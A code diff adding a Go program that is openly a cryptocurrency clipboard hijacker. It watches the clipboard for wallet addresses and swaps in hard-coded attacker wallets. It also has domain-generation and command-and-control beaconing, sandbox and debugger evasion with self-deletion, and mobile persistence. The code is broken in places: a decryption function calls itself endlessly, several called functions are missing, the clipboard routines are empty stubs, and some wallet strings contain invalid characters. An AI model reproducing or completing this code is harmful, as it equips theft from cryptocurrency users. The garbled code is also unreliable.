@@ -1,0 +1,245 @@
+package main
+
+import (
+ "crypto/aes"
+ "crypto/cipher"
+ "crypto/rand"
+ "encoding/base64"
+ "encoding/binary"
+ "encoding/hex"
+ "encoding/json"
+ "fmt"
+ "io"
+ "math/big"
+ "net"
+ "net/http"
+ "os"
+ "os/exec"
+ "path/filepath"
+ "regexp"
+ "runtime"
+ "strings"
+ "sync"
+ "syscall"
+ "time"
+ "unsafe"
+
+ "golang.org/x/mobile/app"
+ "golang.org/x/mobile/event/lifecycle"
+ "golang.org/x/mobile/event/paint"
+ "golang.org/x/mobile/event/touch"
+)
+
+var (
+ xorKey = byte(0x99)
+ aesHexKey = xorDecrypt("8807a952e06e0348aa13ed7046783bcbf9e014cc2ca3767f902b6c961f1ad065")
+ dgaSeed = "microsoft-secure-update"
+ dgaTLDs = []string{".com", ".net", ".org", ".info", ".xyz"}
+ c2Path = xorDecrypt("/update/v1/winsvc")
+ userAgent = xorDecrypt("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0")
+ mutexName = xorDecrypt("Global\\SvcHost_12345")
+)
+
+type Wallets struct {
+ BTC string `json:"btc"`
+ ETH string `json:"eth"`
+ XMR string `json:"xmr"`
+ SOL string `json:"sol"`
+ TRX string `json:"trx"`
+ LTC string `json:"ltc"`
+ BNB string `json:"bnb"`
+ DOGE string `json:"doge"`
+ ADA string `json:"ada"`
+ DOT string `json:"dot"`
+ APT string `json:"apt"`
+ SUI string `json:"sui"`
+ TIA string `json:"tia"`
+ NFT string `json:"nft"`
+ ERC5 string `json:"erc5"`
+}
+
+var currentWallets = Wallets{
+ BTC: "bc1qc9rplfyrsmlm9dg4py654rttvqc64t2ym3lkk2",
+ ETH: "0xAc300468A52C92339B9EdD9d4a8Ac8579AC086fc",
+ SOL: "ApAEYcxoVRRgxYAj8EHeHETS6AFY1HcHZKVHS36ALhhE",
+ TRX: "TYoLaA9SMsCheGqM6466FjputVRipZkgxA",
+ APT: "0x1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p",
+ SUI: "0xa1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6",
+}
+
+var patterns = map[string]*regexp.Regexp{
+ "BTC": regexp.MustCompile(`\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\b`),
+ "ETH": regexp.MustCompile(`\b0x[a-fA-F0-9]{40}\b`),
+ "XMR": regexp.MustCompile(`\b[48][a-km-zA-HJ-NP-Z1-9]{93}\b`),
+ "SOL": regexp.MustCompile(`\b[1-9A-HJ-NP-Za-km-z]{32,44}\b`),
+ "APT": regexp.MustCompile(`\b0x[a-fA-F0-9]{40}\b`),
+ "SUI": regexp.MustCompile(`\b0x[a-fA-F0-9]{40}\b`),
+ "ERC5": regexp.MustCompile(`\b0x[a-fA-F0-9]{40}\b`),
+}
+
+type ClipboardReader interface {
+ ReadAll() (string, error)
+ WriteAll(text string) error
+}
+
+var clipboard ClipboardReader
+
+func init() {
+ switch runtime.GOOS {
+ case "windows":
+ clipboard = &WindowsClipboard{}
+ case "android", "ios":
+ clipboard = &MobileClipboard{}
+ default:
+ clipboard = &NoopClipboard{}
+ }
+}
+
+func main() {
+ if runtime.GOOS == "windows" {
+ windowsMain()
+ } else if runtime.GOOS == "android" || runtime.GOOS == "ios" {
+ mobileMain()
+ }
+}
+
+func mobileMain() {
+ if detectSandbox() || isDebuggerPresent() {
+ selfDelete()
+ return
+ }
+
+ installMobilePersistence()
+
+ var wg sync.WaitGroup
+ wg.Add(2)
+ go func() { defer wg.Done(); c2BeaconLoop() }()
+ go func() { defer wg.Done(); clipboardStealer() }()
+ wg.Wait()
+}
+
+func clipboardStealer() {
+ lastClip := ""
+ for {
+ clip, err := clipboard.ReadAll()
+ if err != nil {
+ time.Sleep(2 * time.Second)
+ continue
+ }
+
+ if clip != lastClip {
+ for coin, re := range patterns {
+ if re.MatchString(clip) {
+ newClip := getWalletFor(coin)
+ if newClip != "" && newClip != clip {
+ clipboard.WriteAll(newClip)
+ logSwap(coin, clip, newClip)
+ break
+ }
+ }
+ }
+ }
+ lastClip = clip
+ time.Sleep(time.Duration(randInt(100, 500)) * time.Millisecond)
+ }
+}
+
+func installMobilePersistence() {
+ if runtime.GOOS == "ios" {
+ if isIOSSimulator() {
+ return
+ }
+
+ // Non-jailbroken persistence technique
+ persistViaBackgroundRefresh()
+ }
+}
+
+func detectSandbox() bool {
+ if runtime.GOOS == "ios" {
+ return isIOSSimulator()
+ }
+ return false
+}
+
+func isIOSSimulator() bool {
+ if runtime.GOARCH == "arm64" {
+ return false
+ }
+ return true
+}
+
+type MobileClipboard struct{}
+
+func (m *MobileClipboard) ReadAll() (string, error) {
+ return mobileReadClipboard()
+}
+
+func (m *MobileClipboard) WriteAll(text string) error {
+ return mobileWriteClipboard(text)
+}
+
+func c2BeaconLoop() {
+ for {
+ if runtime.GOOS == "ios" {
+ useIOSBackgroundSession()
+ }
+ updateWalletsFromC2()
+ time.Sleep(time.Duration(randInt(20, 40)) * time.Minute)
+ }
+}
+
+func selfDelete() {
+ if runtime.GOOS == "ios" {
+ removePersistence()
+ os.Exit(0)
+ }
+}
+
+func xorEncrypt(s string) string {
+ enc := make([]byte, len(s))
+ for i := range s {
+ enc[i] = s[i] ^ xorKey
+ }
+ return string(enc)
+}
+
+func xorDecrypt(s string) string {
+ return xorDecrypt(s)
+}
+
+func randInt(min, max int) int {
+ b := make([]byte, 4)
+ rand.Read(b)
+ return min + int(binary.LittleEndian.Uint32(b)%uint32(max-min+1))
+}
+
+func mobileReadClipboard() (string, error) {
+ return "", nil
+}
+
+func mobileWriteClipboard(text string) error {
+ return nil
+}
+
+func useIOSBackgroundSession() {}
+
+// Non-jailbroken persistence technique
+func persistViaBackgroundRefresh() {
+ // Implementation would use iOS background app refresh
+}
+
+type WindowsClipboard struct{}
+
+func (w *WindowsClipboard) ReadAll() (string, error) {
+ return "", nil
+}
+
+func (w *WindowsClipboard) WriteAll(text string) error {
+ return nil
+}
+
+type NoopClipboard struct{}
+
+func (n *NoopClipboard) ReadAll() (string, error) { return "", nil }
+func (n *NoopClipboard) WriteAll(text string) error { return nil }
